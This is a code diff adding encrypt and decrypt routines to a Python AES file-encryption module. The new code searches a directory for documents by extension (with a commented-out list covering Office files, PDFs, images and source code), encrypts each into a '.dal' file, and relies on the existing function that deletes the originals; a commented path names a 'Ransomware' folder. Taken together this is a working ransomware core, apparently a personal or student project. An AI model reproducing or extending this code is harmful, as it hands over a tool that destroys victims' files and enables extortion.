@@ -1,6 +1,8 @@
-import os,struct
+import os,struct,hashlib
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
+from Search import search
+from Get_data import get_key
 
 def encrypt_file(key, in_filename, chunksize=65536):
     out_filename = in_filename+".dal"
@@ -42,3 +44,34 @@ def decrypt_file(key, in_filename, chunksize=24*1024):
             outfile.truncate(origsize[0])
 
     os.unlink(in_filename)
+
+def encrypt(default_path):
+    password = bytes(get_key(),encoding="utf-8")
+    key = hashlib.sha256(password).digest()
+
+    ext_list = [".hwp"]
+    '''
+    ext_list = [".doc", ".docx", ".hwp", ".c", ".cpp",
+    ".java",".ppt", ".pptx", ".pptm", ".jpg",
+    ".png", ".jpeg", ".gif", ".bmp", ".txt",".pdf",".html"]
+    '''
+    file,directory = search(default_path, ext_list)
+
+    for i in file:
+        encrypt_file(key,i)
+
+    print("Encrypted Finish!")
+
+def decrypt(default_path):
+    password = bytes(get_key(), encoding="utf-8")
+    key = hashlib.sha256(password).digest()
+
+    #default_path = os.path.dirname(os.path.realpath(__file__))
+    # default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
+    ext_list = [".dal"]
+    file, directory = search(default_path, ext_list)
+
+    for i in file:
+        decrypt_file(key, i)
+
+    print("Decrypted Finish!")
